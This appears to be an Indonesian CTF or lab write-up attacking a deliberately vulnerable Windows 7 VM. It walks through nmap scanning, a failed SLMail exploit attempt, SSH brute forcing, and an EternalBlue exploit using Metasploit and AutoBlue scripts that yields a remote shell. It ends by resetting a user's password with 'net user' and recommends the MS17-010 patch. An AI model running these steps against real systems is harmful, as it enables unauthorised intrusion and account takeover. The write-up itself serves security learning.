File .ova yang diberikan adalah Escalate Win, dari nama virtual machine sendiri kita mendapat petunjuk kalau virtual machine akan berhubungan dengan privilege escalation.
Hal ini diperkuat dengan username dan password yang diberikan untuk mengakses virtual machine windows 7 ini yaitu:

```
Username : netsec
Password : netsec123$
```

Namun credential tersebut tidak dapat digunakan untuk membuka / mendapatkan akses ke desktop, oleh karena itu kemungkinan besar Escalate Win adalah virtual machine yang dibuat untuk melakukan privilege escalation untuk dapat mengakses desktop windows

Lakukan nmap pada virtual machine untuk melihat port dan service apa saja yang ada di virtual machine tersebut, untuk melakukan nmap kita memerlukan informasi IP address dari VM tersebut, karena kita tidak dapat mendapatkan akses ke desktop sehingga tidak bisa melihat IP Address dari VM dapat dilakukan dengan beberapa cara.
1. Menggunakan `VBoxManage guestproperty enumerate <vboxname>`  
   Karena virtual machine ini bernama **Escalate_Win** dengan perintah berikut akan didapatkan property dari virtual machine
   `VBoxManage guestproperty enumerate Escalate_Win`  
   ![VBoxManage](./asset/VBoxManage.png)  
   Dari gambar diatas kita dapatkan IP Address dari VM adalah `192.168.0.16`
2. Menggunakan `nmap <ip address range>`  
   Dengan menggunakan `nmap 192.168.0.1-254` yang merupakan ip address local komputer ini dan yang akan didapatkan oleh VM karena VM menggunakan *Bridged Adapter*.  
   ![Nmap Scan](./asset/NmapScan.png)  
   Dari list tersebut dapat dilihat dari list MAC Address pada bagian paling bawah terdapat `Oracle VirtualBox Virtual NIC`  maka dapat disimpulkan IP Address dari VM adalah `192.168.0.16`

Setelah kita dapatkan IP Address dari VM, langkah selanjutnya adalah melakukan *Deep Scanning* untuk mendapatkan informasi seperti port apa yang terbuka dan service apa saja yang sedang berjalan pada VM.  

Gunakan `sudo nmap -sC -sV -oA scan 192.168.0.16` untuk mendapatkan informasi lebih detail menggenai VM, namun dari beberapa scan terdapat hasil yang beragam 
Dari hasil scan tersebut dapat dilihat port yang terbuka, service, serta versi dari service tersebut
- 21, ftp, Filezilla (0.9.41 beta)
- 22, ssh, OpenSSH 6.7
- 25, smtp, SLmail 5.5.0.4333
- 80, http, Apache httpd 2.4.33 ((Win32) OpenSSL/1.0.2n PHP/5.6.35)
- 135, msrpc, Microsoft Windows RPC
- 139, netbios-ssn, Microsoft Windows netbios-ssn
- 443, ssl/http, Apache httpd 2.4.33 ((Win32) OpenSSL/1.0.2n PHP/5.6.35)
- 445, microsoft-ds, Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
- 3306, mysql, MariaDB (unauthorized)
- 49152, msrpc, Microsoft Windows RPC
- 49153, msrpc, Microsoft Windows RPC
- 49154, msrpc, Microsoft Windows RPC
- 49155, msrpc, Microsoft Windows RPC
- 49156, msrpc, Microsoft Windows RPC
- 49157, msrpc, Microsoft Windows RPC
![Deep Scan](./asset/DeepScan.png)

Langkah selanjutnya adalah melakukan vulnerability assesment pada VM dengan informasi yang kita dapatkan barusan, tools yang akan digunakan adalah [metasploit](https://www.offensive-security.com/metasploit-unleashed/)

## Filezilla (0.9.41 beta)
Tidak dapat di lakukan karena minimnya resource exploitasi Filezilla, dan majority resources yang ditemukan adalah POST Exploit yang dimana sudah didapatkan akses shell ke VM
## SLmail 5.5.0.4333
Berdasarkan hasil pencarian, `Seattle Lab Mail` versi ini memiliki vulnerability
> There exists an unauthenticated buffer overflow vulnerability in the
  POP3 server of Seattle Lab Mail 5.5 when sending a password with
  excessive length. Successful exploitation should not crash either
  the service or the server; however, after initial use the port
  cannot be reused for successive exploitation until the service has
  been restarted. Consider using a command execution payload following
  the bind shell to restart the service if you need to reuse the same
  port. The overflow appears to occur in the debugging/error reporting
  section of the slmail.exe executable, and there are multiple offsets
  that will lead to successful exploitation. This exploit uses 2606,
  the offset that creates the smallest overall payload. The other
  offset is 4654. The return address is overwritten with a "jmp esp"
  call from the application library SLMFC.DLL found in
  %SYSTEM%\system32\. This return address works against all version of
  Windows and service packs. The last modification date on the library
  is dated 06/02/99. Assuming that the code where the overflow occurs
  has not changed in some time, prior version of SLMail may also be
  vulnerable with this exploit. The author has not been able to
  acquire older versions of SLMail for testing purposes. Please let us
  know if you were able to get this exploit working against other
  SLMail versions.

Dikutip dari `metasploit`, dan akan kita gunakan exploit ini untuk melakukan vulnerability assesment, namun tidak berhasil di exploit karena service SLMail tidak berjalan pada VM
![SLMail Test Result](./asset/SLMail.png)
Namun tidak menutup kemungkinan akan berhasil apabila service SLMail berjalan pada VM

## SSH
Untuk menguji ssh ini kita akan menggunakan `Bruteforce`, dalam metasploit akan digunakan `auxiliary/scanner/ssh/ssh_login`.  
Namun setelah dicoba tidak berhasil mendapatkan credential yang dapat digunakan untuk mengakses shell pada VM
![SSH Bruteforce](./asset/SSHBruteforce.png)
Data yang digunakan pada `root_userpass.txt` tidak banyak sehingga dapat berjalan dengan cepat, apabila ingin menggunakan data yang lebih banyak dapat menggunakan hydra namun tentu saja akan memakan waktu yang lama

## SMB
SMB menggunakan port 445, dalam metasploit SMB merupakan salah satu vulnerability yang sering ditemukan pada windows.  
Dengan metasploit gunakan `nmap --script vuln -p 445 192.168.0.16` untuk mendeteksi SMB Vulnerability
![Vuln Scanner](./asset/VulnScanner.png)
Dari hasil scan ditemukan bahwa VM memiliki vulnerability pada `smb-vuln-ms17-010`, pada metasploit sudah tersedia module untuk menyerang vulnerability ini.  

Gunakan `use exploit/windows/smb/ms17_010_eternalblue` dan set `RHOSTS` menjadi `192.168.0.16`
![Setup Eternal Blue](./asset/OptionSetupEternalBlue.png)
Setelah berhasil di setup, gunakan `exploit` atau `run` untuk menjalankan exploitnya

![Result](./asset/EternalBlue.png)
Namun metasploit mengeluarkan error module hanya dapat digunakan untuk windows versi 64 Bit, sedangkan Escalate_Win adalah windows 7 32 Bit. Sehingga tidak dapat menggunakan module `Eternal Blue` yang ada pada metasploit. Tapi kita sudah mengetahui bahwa Eternal Blue adalah salah satu vulnerability yang bisa di exploit dari pada vulnerabilities di poin poin sebelumnya.

Karena module pada metasploit hanya dapat digunakan untuk windows versi 64 bit, kita perlu mencari alternatif lain untuk dapat melakukan exploit `Eternal Blue` pada windows 32 bit.  Setelah melakukan pencarian didapatkan [Eternal Blue MS17-10](https://github.com/3ndG4me/AutoBlue-MS17-010) yang dirasa dapat digunakan untuk windows 32 bit

![Eternal Checker](./asset/EternalBlueChecker.png)
Sebelum melakukan check seperti gambar diatas perlu kita check terlebih dahulu IP Address dari VM karena dapat berubah, disini IP Address VM berubah menjadi `192.168.0.3`. Dari hasil script diatas terdapat `The target is not patched` sehingga VM memang memliki eternal blue vulnerability.  

![Shell Prep](./asset/ShellPrep.png)
Setelah itu masuk ke direktori `shellcode` dan jalankan `./shell_prep.sh`, masukan parameter yang sama seperti pada `msfconsole` mengenai LHOST dan port yang akan digunakan

Naik ke main direktori dan jalankan `./listener_prep.sh` dan masukan informasi yang sama seperti di awal tadi maka akan langsung masuk ke `msfconsole` seperti gambar dibawah ini dan jangan ditutup
![Listener](./asset/Listener.png)
![Result](./asset/MSFAfterListener.png)

Selanjutkan kita jalankan `python eternalblue_exploit7.py 192.168.0.3 shellcode/sc_all.bin` untuk mendapatkan akses ke shell VM. Namun setiap kali kita jalankan script ini VM akan langsung *Bluescreen* dan output dari script adalah sebagai berikut.  
![Error Result](./asset/ErrorResult.png)

Namun dalama `shellcode` terdapat `sc_x86.bin` akan kita coba run `python eternalblue_exploit7.py 192.168.0.3 shellcode/sc_x86.bin`
![x86 Result](./asset/x86.png)
Script menunjukan **done** yang menandakan semestinya kita sudah bisa mendapatkan shell dari VM, kita check terminal yang menjalankan `./listener_prep.sh`, Kita berpindah ke terminal tersebut dan dapat dilihat digambar dibawah 
![x86 Success Result](./asset/GetSession.png)
Kemudian gunakan `sessions -i 2` sesuai nomer session id nya untuk terhubung dengan metepreter VM, dari gambar dibawah kita suah berhasil mendapatkan informasi dari VM
![Result](./asset/ResultConnection.png)

Namun karena kesusahan untuk melakukan privilege escalation melalui metepreter kita coba mengulangi tahapan diatas namun menggunakan pilihan `1` ketika memilih `metepreter` atau `normal cmd` sama seperti sebelumnya gunakan `sessions -i` untuk melihat session yang terhubung dan gunakan `sessions -i <session-id>` untuk terhubung ke shell
![CMD SUCCESS](./asset/RESULTCMD.png)

Gunakan `net user` untuk melihat user yang ada pada VM
![NET USER](./asset/NetUser.png)

Gunakan `net user low_priv` untuk melihat detail dari user tersebut
![NET USER low_priv](./asset/low_priv.png)

Disini bisa kita gunakan `net user low_priv <password>` untuk menganti passwod dari user tersebut

![CHANGE PASS](./asset/UpdatePassword.png)

Setelah itu bisa kita coba untuk login
![Access](./asset/AccessVM.png)

## Solusi
EternalBlue adalah vulnerability yang menyerang ke berbagai macam versi windows mulai dari XP, 7, 8, 10, windows server. Untuk mengatasi vulnerability ini perlu dilakukan update pada windows terutama [MS17-10](https://support.microsoft.com/en-us/topic/how-to-verify-that-ms17-010-is-installed-f55d3f13-7a9c-688c-260b-477d0ec9f2c8)

